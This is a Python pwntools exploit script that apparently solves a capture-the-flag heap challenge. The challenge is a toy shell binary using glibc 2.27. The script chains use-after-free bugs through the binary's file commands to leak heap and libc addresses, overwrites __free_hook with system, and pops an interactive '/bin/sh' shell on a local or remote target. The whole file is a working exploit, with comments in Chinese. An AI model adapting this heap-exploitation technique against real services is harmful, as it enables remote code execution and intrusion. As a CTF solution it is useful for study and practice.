#encoding:utf-8
from pwn import *
import sys

local       = 1
binary      = "./chall"
local_libc  = "/glibc/2.27_old/amd64/lib/libc-2.27.so"
ip          = "192.168.40.10"
port        = 29538
remote_libc = "./libc.so.6"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        # p=process(binary)
        p=process(binary,env={'LD_PRELOAD':'/glibc/2.27_old/amd64/lib/libc-2.27.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        p=remote(ip,port)
        libc=ELF(remote_libc)
        pwn()

def pwd():
    p.sendlineafter("command> ","pwd")
def ls(path):
    p.sendlineafter("command> ","ls")
    p.sendlineafter("path> ",path)
def mkdir(name):
    p.sendlineafter("command> ","mkdir")
    p.sendlineafter("name> ",name)
def cd(path):
    p.sendlineafter("command> ","cd")
    p.sendlineafter("path> ",path)
#def cat():
#    p.sendlineafter("command> ","cat")
def touch(filename):
    p.sendlineafter("command> ","touch")
    p.sendlineafter("filename> ",filename)
def rm(filename):
    p.sendlineafter("command> ","rm")
    p.sendlineafter("filename> ",filename)
def echo(arg,redirect,path=''):
    p.sendlineafter("command> ","echo")
    p.sendlineafter("arg> ",arg)
    p.sendlineafter("redirect?> ",redirect)
    if redirect == 'y' or redirect == 'Y':
        p.sendlineafter("path> ",path)

def pwn():
    # 申请一个 0xd0 UAF 堆块
    mkdir('skye')
    cd('skye')
    touch('skye_file_0')
    echo('b'*0xa8,'y','skye_file_0')
    cd('..')
    rm('./skye/skye_file_0')    
    touch('root_file_0')
    
    # 申请一个 0x30 UAF 堆块
    cd('skye')
    touch("skye_file_1")
    echo('c'*0x28,'y','skye_file_1')
    cd('..')
    rm('./skye/skye_file_1')
    rm('./skye/skye_file_0')
    
    # 文件夹名堆块 UAF 泄露地址
    cd('skye')
    mkdir('heap')
    cd('heap')
    rm('../skye_file_1')
    rm('../skye_file_1')
    p.recvuntil("/skye/")
    heap_addr = u64(p.recv(6).ljust(8,'\x00'))
    print "heap_addr:",hex(heap_addr)
    heap_base = heap_addr - 0x57e0
    print "heap_base:",hex(heap_base)
    
    # UAF unsortedbin
    cd('..')
    mkdir('\x00')
    mkdir('heap')
    touch('skye_file_2')
    echo('b'*0xa8,'y','skye_file_2')
    touch('skye_file_3')
    cd('heap')
    for _ in range(8):
        rm('../skye_file_2')

    # 文件夹名堆块 UAF 泄露地址
    payload = 'a'*8+p64(heap_base+0x5460)
    payload += 'a'*0x80
    payload += p64(heap_base+0x5a50)
    echo(payload,'y','../skye_file_0')
    p.recvuntil("/skye/")
    main_arena = u64(p.recv(6).ljust(8,'\x00'))-96
    print "main_arena:",hex(main_arena)
    libc_base = main_arena - (0x7ffff7dcdc40-0x7ffff7a1f000)
    print "libc_base:",hex(libc_base) 
    free_hook = libc_base + libc.sym['__free_hook']
    print "free_hook:",hex(free_hook)
    system = libc_base + libc.sym['system']
    print "system:",hex(system)

    rm('../skye_file_1')
    rm('../skye_file_1')
    cd('..')
    touch(p64(free_hook))
    touch('/bin/sh\x00')
    touch(p64(system))
    echo('/bin/sh\x00','y','skye_file_0')
    rm('skye_file_0')

    #debug(p,"b *$rebase(0x1FE5)")
    
    p.interactive()

def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True).strip()
    
def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
